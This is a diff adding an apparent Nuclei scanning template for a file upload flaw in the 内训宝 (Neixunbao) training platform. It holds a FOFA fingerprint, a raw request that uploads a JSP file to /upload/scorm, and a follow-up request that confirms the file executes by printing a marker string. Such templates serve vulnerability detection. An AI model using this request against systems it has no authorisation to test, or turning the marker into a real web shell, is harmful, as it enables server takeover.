@@ -1,0 +1,54 @@
+id: neixunbao-upload_scorm-File-upload
+
+info:
+  name: "内训宝企业培训平台 upload 接口文件上传漏洞"
+  author: Unknown
+  severity: high
+  description: |-
+    fofa: icon_hash="-790843908"
+      内训宝企业培训平台 upload/scorm 接口存在文件上传漏洞，攻击者可利用该漏洞在服务器端执行任意代码，部署后门程序，进而获取服务器控制权限，最终实现对整个Web服务器的控制。
+  reference:
+  - https://mp.weixin.qq.com/s/I4RKLZDQqUSrWkVW4fnBHw?token=1497378487&lang=zh_CN
+  tags: 内训宝企业培训平台
+
+variables:
+  username: "{{to_lower(rand_base(6))}}" #从可选字符集（默认为字母和数字）生成给定长度字符串的随机序列
+
+http:
+- raw:
+  - |
+    POST /upload/scorm HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36
+    Accept-Encoding: gzip, deflate
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFfJZ4PlAZBixjELj
+    Accept: */*
+    Connection: close
+
+    ------WebKitFormBoundaryFfJZ4PlAZBixjELj
+    Content-Disposition: form-data; name="fileupload"; filename="{{username}}.jsp"
+    Content-Type: application/octet-stream
+
+    <% out.println("pboyjnnrfipmplsukdeczudsefxmywe");%>
+    ------WebKitFormBoundaryFfJZ4PlAZBixjELj--
+  - |
+    GET /upload/imgdefault/common/{{uploadfile}} HTTP/1.1
+    Host: {{Hostname}}
+  extractors:
+  - type: regex
+    part: body
+    name: uploadfile
+    group: 1
+    regex:
+    - '([0-9]+/\w+\.jsp)'
+    internal: true
+
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - 'pboyjnnrfipmplsukdeczudsefxmywe'
+  - type: status
+    status:
+    - 200
